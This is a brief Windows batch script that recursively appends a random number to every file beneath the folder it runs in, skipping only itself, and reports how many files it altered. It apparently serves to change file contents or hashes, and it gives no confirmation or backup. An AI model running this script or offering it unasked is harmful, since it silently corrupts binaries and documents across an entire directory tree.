@echo off
set /a Counter=0
for /r  %%i in (*) do (
IF NOT [%%i] == [%~0] (
ECHO %RANDOM%>> "%%i"
set /a Counter+=1
)
)
ECHO Augmented %Counter% file(s)
pause